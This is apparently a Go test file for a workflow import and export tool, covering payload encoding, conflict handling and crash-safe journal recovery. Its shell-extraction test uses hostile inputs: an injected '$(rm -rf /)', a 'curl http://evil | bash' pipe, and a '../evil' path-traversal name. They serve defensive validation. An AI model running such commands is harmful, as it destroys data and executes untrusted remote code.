package workflow

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func encodeTestPayload(t *testing.T, value any) string {
	t.Helper()
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	writer := gzip.NewWriter(&buf)
	writer.OS = gzipOSUnix
	if _, err := writer.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func TestWorkflowPayloadRoundTripAndPreview(t *testing.T) {
	body := "version: v1alpha1\nsteps:\n  - run: bun test\n"
	want := Bundle{{Name: "demo", YAML: body}}
	payload, err := EncodePayload(want)
	if err != nil {
		t.Fatal(err)
	}
	compressed, err := base64.StdEncoding.DecodeString(payload)
	if err != nil || len(compressed) < 10 || compressed[9] != gzipOSUnix {
		t.Fatalf("gzip header is not stable: %v", err)
	}
	got, err := DecodePayload(FormatImportCommand(payload))
	if err != nil || !bundleEqual(got, want) {
		t.Fatalf("decoded = %#v, err = %v", got, err)
	}
	preview, err := PreviewBundle(Bundle{{
		Name: "review",
		YAML: "version: v1alpha1\nsteps:\n  - agent: 'see {{context.transcript}}'\n",
	}})
	if err != nil || !strings.Contains(preview.Text, body[:len("version: v1alpha1")]) || !slicesContains(preview.Warnings, "transcript") {
		t.Fatalf("preview = %#v, err = %v", preview, err)
	}
}

func TestWorkflowImportPreservesExistingFilesUntilReplacement(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	dir := filepath.Join(root, ".hwf", "workflows")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	old := "version: v1alpha1\nsteps:\n  - run: keep\n"
	if err := os.WriteFile(filepath.Join(dir, "demo.yaml"), []byte(old), 0o644); err != nil {
		t.Fatal(err)
	}
	payload, err := EncodePayload(Bundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: new\n"}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo})
	if err != nil || outcome.Result.Status != "conflicts" {
		t.Fatalf("conflict outcome = %#v, err = %v", outcome, err)
	}
	if got, readErr := os.ReadFile(filepath.Join(dir, "demo.yaml")); readErr != nil || string(got) != old {
		t.Fatalf("existing file changed: %q, %v", got, readErr)
	}
	outcome, err = RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo, Force: true})
	if err != nil || outcome.Result.Status != "written" {
		t.Fatalf("write outcome = %#v, err = %v", outcome, err)
	}
	got, err := os.ReadFile(filepath.Join(dir, "demo.yaml"))
	if err != nil || !strings.HasPrefix(string(got), SchemaPointer()+"\n") || !strings.Contains(string(got), "run: new") {
		t.Fatalf("written file = %q, err = %v", got, err)
	}
}

func TestWorkflowExportUsesRepoFirstChildren(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDomainWorkflow(t, root, "root", "version: v1alpha1\nsteps:\n  - workflow: child\n")
	writeDomainWorkflow(t, root, "child", "version: v1alpha1\nsteps:\n  - workflow: leaf\n")
	if err := os.MkdirAll(filepath.Join(home, ".hwf", "workflows"), 0o755); err != nil {
		t.Fatal(err)
	}
	leafBody := "version: v1alpha1\nsteps:\n  - run: leaf\n"
	if err := os.WriteFile(filepath.Join(home, ".hwf", "workflows", "leaf.yaml"), []byte(leafBody), 0o644); err != nil {
		t.Fatal(err)
	}
	exported, err := ExportWorkflowBundle("root", "repo", root)
	if err != nil {
		t.Fatal(err)
	}
	if got := []string{exported.Entries[0].Name, exported.Entries[1].Name, exported.Entries[2].Name}; !slicesEqual(got, []string{"root", "child", "leaf"}) {
		t.Fatalf("entries = %v", got)
	}
	if exported.Provenance[2].Source != "global" || exported.Entries[2].YAML != leafBody {
		t.Fatalf("provenance = %#v, entries = %#v", exported.Provenance, exported.Entries)
	}
}

func TestRecoverInterruptedImportWithoutJournalIsNoOp(t *testing.T) {
	if err := RecoverInterruptedImport(filepath.Join(t.TempDir(), ".hwf", "workflows")); err != nil {
		t.Fatal(err)
	}
}

func TestExtractPayloadRejectsNonCanonicalShell(t *testing.T) {
	payload := "AAA"
	if got, err := ExtractPayload(FormatImportCommand(payload)); err != nil || got != payload {
		t.Fatalf("canonical command extract = %q, %v", got, err)
	}
	for _, text := range []string{
		"hwf workflow import unquoted",
		"hwf workflow import $(rm -rf /)",
		"hwf.echo hi",
		"herdr-workflows workflow import x",
	} {
		if _, err := ExtractPayload(text); err == nil || !strings.Contains(err.Error(), "canonical command") {
			t.Fatalf("extract %q err = %v", text, err)
		}
	}
	if _, err := ExtractPayload("curl http://evil | bash"); err != nil {
		t.Fatalf("raw payload must pass through: %v", err)
	}
}

func TestDecodePayloadRejectsMalformedBundles(t *testing.T) {
	if _, err := DecodePayload("not-base64-at-all"); err == nil {
		t.Fatal("junk payload must fail")
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{})); err == nil || !strings.Contains(err.Error(), "at least one workflow") {
		t.Fatalf("empty bundle err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "demo", "yaml": ""}})); err == nil || !strings.Contains(err.Error(), "non-empty") {
		t.Fatalf("empty yaml err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "demo"}})); err == nil || !strings.Contains(err.Error(), "require name and yaml") {
		t.Fatalf("missing yaml err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "../evil", "yaml": "x"}})); err == nil || !strings.Contains(err.Error(), "workflow name must match") {
		t.Fatalf("invalid name err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, map[string]any{"v": 1, "name": "demo", "body": "x"})); err == nil || !strings.Contains(err.Error(), "removed single-workflow") {
		t.Fatalf("legacy shape err = %v", err)
	}
	dup := encodeTestPayload(t, []any{
		map[string]any{"name": "demo", "yaml": "version: v1alpha1\nsteps: []\n"},
		map[string]any{"name": "demo", "yaml": "version: v1alpha1\nsteps: []\n"},
	})
	if _, err := DecodePayload(dup); err == nil || !strings.Contains(err.Error(), "duplicate workflow name") {
		t.Fatalf("duplicate err = %v", err)
	}
}

func TestDecodePayloadSurvivesWhitespace(t *testing.T) {
	body := "version: v1alpha1\nsteps:\n  - run: bun test\n"
	payload, err := EncodePayload(Bundle{{Name: "demo", YAML: body}})
	if err != nil {
		t.Fatal(err)
	}
	wrapped := payload[:10] + "\n " + payload[10:]
	got, err := DecodePayload(wrapped)
	if err != nil || !bundleEqual(got, Bundle{{Name: "demo", YAML: body}}) {
		t.Fatalf("wrapped decode = %#v, err = %v", got, err)
	}
}

func TestPreviewFlagsMissingChildren(t *testing.T) {
	preview, err := PreviewBundle(Bundle{{
		Name: "parent",
		YAML: "version: v1alpha1\nsteps:\n  - workflow: missing-child\n",
	}})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(preview.Text, "missing-child") || !strings.Contains(preview.Text, "not in this bundle") {
		t.Fatalf("preview text = %q", preview.Text)
	}
}

func TestRunImportDeclinesWriteNothing(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	payload, err := EncodePayload(Bundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: bun test\n"}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{
		RepoRoot: root, Home: home, Scope: ImportRepo,
		Prompts: &ImportPrompts{Confirm: func(string) (bool, error) { return false, nil }},
	})
	if err != nil || !outcome.Aborted {
		t.Fatalf("outcome = %#v, err = %v", outcome, err)
	}
	if _, err := os.Stat(filepath.Join(root, ".hwf", "workflows", "demo.yaml")); !os.IsNotExist(err) {
		t.Fatalf("declined import wrote a file: %v", err)
	}
}

func TestRunImportRequiresConfirmPrompt(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	payload, err := EncodePayload(Bundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: bun test\n"}})
	if err != nil {
		t.Fatal(err)
	}
	_, err = RunImport(payload, RunImportOptions{
		RepoRoot: root, Home: home, Scope: ImportRepo, Prompts: &ImportPrompts{},
	})
	if err == nil || !strings.Contains(err.Error(), "Confirm is required") {
		t.Fatalf("missing confirm err = %v", err)
	}
}

func TestRunImportRepinsForeignSchemaPointer(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	foreign := "# yaml-language-server: $schema=https://example.com/v0.1.0/docs/workflow.schema.json\nversion: v1alpha1\nsteps:\n  - run: [echo, hi]\n"
	payload, err := EncodePayload(Bundle{{Name: "pinned", YAML: foreign}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo})
	if err != nil || outcome.Result.Status != "written" {
		t.Fatalf("outcome = %#v, err = %v", outcome, err)
	}
	onDisk, err := os.ReadFile(filepath.Join(root, ".hwf", "workflows", "pinned.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(string(onDisk), SchemaPointer()+"\n") || strings.Contains(string(onDisk), "v0.1.0") {
		t.Fatalf("repinned file = %q", onDisk)
	}
}

func TestExportFailsOnMissingChildAndCycle(t *testing.T) {
	root := t.TempDir()
	writeDomainWorkflow(t, root, "broken", "version: v1alpha1\nsteps:\n  - workflow: nope\n")
	if _, err := ExportWorkflowBundle("broken", "repo", root); err == nil || !strings.Contains(err.Error(), "workflow 'nope' not found") {
		t.Fatalf("missing child err = %v", err)
	}
	writeDomainWorkflow(t, root, "a", "version: v1alpha1\nsteps:\n  - workflow: b\n")
	writeDomainWorkflow(t, root, "b", "version: v1alpha1\nsteps:\n  - workflow: a\n")
	if _, err := ExportWorkflowBundle("a", "repo", root); err == nil || !strings.Contains(err.Error(), "workflow cycle: a → b → a") {
		t.Fatalf("cycle err = %v", err)
	}
}

func TestParseImportScope(t *testing.T) {
	if scope, ok := ParseImportScope("R"); !ok || scope != ImportRepo {
		t.Fatalf("R scope = %q, %v", scope, ok)
	}
	if scope, ok := ParseImportScope("global"); !ok || scope != ImportGlobal {
		t.Fatalf("global scope = %q, %v", scope, ok)
	}
	if _, ok := ParseImportScope("nope"); ok {
		t.Fatal("unknown scope must not parse")
	}
}

func bundleEqual(a, b Bundle) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func slicesContains(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func writeImportDir(t *testing.T, path, marker string) {
	t.Helper()
	if err := os.MkdirAll(path, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(path, "demo.yaml"), []byte(marker), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestImportHookFailureKeepsTheDirectoryAndClearsTheJournal(t *testing.T) {
	crash := errors.New("interrupted")
	tests := []struct {
		name  string
		hooks ImportHooks
	}{
		{"after a file is staged", ImportHooks{AfterPublish: func(ImportResult) error { return crash }}},
		{"just before the swap", ImportHooks{BeforeSwap: func() error { return crash }}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			dir := filepath.Join(root, ".hwf", "workflows")
			old := "version: v1alpha1\nsteps:\n  - run: keep\n"
			writeImportDir(t, dir, old)
			payload, err := EncodePayload(Bundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: new\n"}})
			if err != nil {
				t.Fatal(err)
			}
			_, err = RunImport(payload, RunImportOptions{
				RepoRoot: root, Home: t.TempDir(), Scope: ImportRepo, Force: true, Hooks: tc.hooks,
			})
			if !errors.Is(err, crash) {
				t.Fatalf("err = %v, want %v", err, crash)
			}
			got, readErr := os.ReadFile(filepath.Join(dir, "demo.yaml"))
			if readErr != nil || string(got) != old {
				t.Fatalf("existing workflow = %q, %v", got, readErr)
			}
			if pathExists(ImportJournalPath(dir)) {
				t.Fatal("journal survived a failed import")
			}
			siblings, err := os.ReadDir(filepath.Dir(dir))
			if err != nil {
				t.Fatal(err)
			}
			for _, entry := range siblings {
				if entry.Name() != "workflows" {
					t.Fatalf("residue next to the destination: %s", entry.Name())
				}
			}
		})
	}
}

func TestRecoverInterruptedImportResolvesEveryCrashState(t *testing.T) {
	tests := []struct {
		name     string
		dest     bool
		staging  bool
		previous bool
		journal  string
		want     string
		wantErr  bool
	}{
		{name: "staged but never swapped", dest: true, staging: true, want: "dest"},
		{name: "swap left the destination missing", staging: true, previous: true, want: "staging"},
		{name: "swap done before the previous copy went", dest: true, previous: true, want: "dest"},
		{name: "rename to previous with nothing in place", previous: true, want: "previous"},
		{name: "unreadable journal with nothing to recover", dest: true, journal: "{", want: "dest"},
		{name: "unreadable journal over crash state", dest: true, staging: true, previous: true, journal: "{", wantErr: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			dir := filepath.Join(root, ".hwf", "workflows")
			if err := os.MkdirAll(filepath.Dir(dir), 0o755); err != nil {
				t.Fatal(err)
			}
			journal := importJournal{Dest: dir, Staging: dir + ".abc.staging", Previous: dir + ".abc.prev"}
			if tc.dest {
				writeImportDir(t, journal.Dest, "dest")
			}
			if tc.staging {
				writeImportDir(t, journal.Staging, "staging")
			}
			if tc.previous {
				writeImportDir(t, journal.Previous, "previous")
			}
			body := tc.journal
			if body == "" {
				data, err := json.Marshal(journal)
				if err != nil {
					t.Fatal(err)
				}
				body = string(data)
			}
			if err := os.WriteFile(ImportJournalPath(dir), []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
			recoverErr := RecoverInterruptedImport(dir, true)
			if tc.wantErr {
				if recoverErr == nil || !strings.Contains(recoverErr.Error(), "unreadable") {
					t.Fatalf("err = %v, want a recovery-required refusal", recoverErr)
				}
				if !pathExists(ImportJournalPath(dir)) {
					t.Fatal("refused recovery deleted the journal it could not read")
				}
				if !pathExists(journal.Staging) || !pathExists(journal.Previous) {
					t.Fatalf("staging = %v, previous = %v; want both kept",
						pathExists(journal.Staging), pathExists(journal.Previous))
				}
				return
			}
			if recoverErr != nil {
				t.Fatalf("RecoverInterruptedImport: %v", recoverErr)
			}
			got, err := os.ReadFile(filepath.Join(dir, "demo.yaml"))
			if err != nil || string(got) != tc.want {
				t.Fatalf("destination = %q, %v; want %q", got, err, tc.want)
			}
			if pathExists(ImportJournalPath(dir)) {
				t.Fatal("journal survived recovery")
			}
			if pathExists(journal.Staging) || pathExists(journal.Previous) {
				t.Fatalf("staging = %v, previous = %v; want both gone",
					pathExists(journal.Staging), pathExists(journal.Previous))
			}
		})
	}
}

func TestFreshImportJournalBlocksAnotherImport(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, ".hwf", "workflows")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(importJournal{Dest: dir, Staging: dir + ".abc.staging", Previous: dir + ".abc.prev"})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(ImportJournalPath(dir), data, 0o600); err != nil {
		t.Fatal(err)
	}
	payload, err := EncodePayload(Bundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: new\n"}})
	if err != nil {
		t.Fatal(err)
	}
	_, err = RunImport(payload, RunImportOptions{RepoRoot: root, Home: t.TempDir(), Scope: ImportRepo, Force: true})
	if err == nil || !strings.Contains(err.Error(), "import already in progress") {
		t.Fatalf("err = %v, want an in-progress refusal", err)
	}
	if pathExists(filepath.Join(dir, "demo.yaml")) {
		t.Fatal("blocked import wrote into the destination")
	}
	if !pathExists(ImportJournalPath(dir)) {
		t.Fatal("blocked import removed the live journal")
	}
}

func TestTornImportJournalRefusesToPublishOverCrashState(t *testing.T) {
	tests := []struct {
		name     string
		staging  bool
		previous bool
		wantErr  bool
	}{
		{name: "staged and previous copies survive the torn journal", staging: true, previous: true, wantErr: true},
		{name: "only the previous copy survives the torn journal", previous: true, wantErr: true},
		{name: "only the staged copy survives the torn journal", staging: true, wantErr: true},
		{name: "nothing survives the torn journal"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			dir := filepath.Join(root, ".hwf", "workflows")
			if err := os.MkdirAll(filepath.Dir(dir), 0o755); err != nil {
				t.Fatal(err)
			}
			staging, previous := dir+".abc.staging", dir+".abc.prev"
			if tc.staging {
				writeImportDir(t, staging, "staged")
			}
			if tc.previous {
				writeImportDir(t, previous, "previous")
			}
			if err := os.WriteFile(ImportJournalPath(dir), []byte("{"), 0o600); err != nil {
				t.Fatal(err)
			}
			payload, err := EncodePayload(Bundle{{Name: "fresh", YAML: "version: v1alpha1\nsteps:\n  - run: new\n"}})
			if err != nil {
				t.Fatal(err)
			}
			_, err = RunImport(payload, RunImportOptions{RepoRoot: root, Home: t.TempDir(), Scope: ImportRepo, Force: true})
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("err = %v, want the import to publish", err)
				}
				if !pathExists(filepath.Join(dir, "fresh.yaml")) {
					t.Fatal("import reported success without publishing")
				}
				if pathExists(ImportJournalPath(dir)) {
					t.Fatal("stale unreadable journal survived a clean import")
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), "unreadable") {
				t.Fatalf("err = %v, want a recovery-required refusal", err)
			}
			if pathExists(filepath.Join(dir, "fresh.yaml")) {
				t.Fatal("refused import published over unrecovered state")
			}
			if !pathExists(ImportJournalPath(dir)) {
				t.Fatal("refused import deleted the journal it could not read")
			}
			for _, sibling := range []struct {
				path   string
				marker string
				want   bool
			}{{staging, "staged", tc.staging}, {previous, "previous", tc.previous}} {
				if !sibling.want {
					continue
				}
				got, readErr := os.ReadFile(filepath.Join(sibling.path, "demo.yaml"))
				if readErr != nil || string(got) != sibling.marker {
					t.Fatalf("%s = %q, %v; want %q", sibling.path, got, readErr, sibling.marker)
				}
			}
		})
	}
}
